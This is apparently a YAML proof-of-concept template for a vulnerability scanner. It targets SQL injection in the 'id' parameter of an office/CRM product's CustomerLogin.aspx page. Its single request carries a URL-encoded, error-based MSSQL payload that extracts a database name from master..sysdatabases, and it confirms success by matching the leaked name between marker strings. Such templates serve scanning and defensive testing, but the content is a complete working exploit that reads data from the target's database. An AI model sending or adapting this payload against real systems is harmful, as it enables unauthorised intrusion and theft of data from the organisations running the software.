name: yaml-poc-hg086-hg086-oa-sql_injection-CT-657454
binding: 8a798a75-206b-4abb-b0ef-ad33e9c73d13
detail:
    author: haiqing.chen
    vulnerability:
        id: e43cdc7f-66f4-4625-b146-34a745ec7079
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /CRMtable/PublicPage/CustomerLogin.aspx?id=1%27%20AND%201840%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20TOP%201%20SUBSTRING%28%28ISNULL%28CAST%28name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%20FROM%20master..sysdatabases%20WHERE%20ISNULL%28CAST%28name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20NOT%20IN%20%28SELECT%20TOP%202%20ISNULL%28CAST%28name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20master..sysdatabases%20ORDER%20BY%20name%29%20ORDER%20BY%20name%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20OlrO
            headers:
                Content-Type: application/x-www-form-urlencoded
        expression: response.status == 500 && response.body_string.contains("qqvzqmsdbqkqpq")
expression: r0()
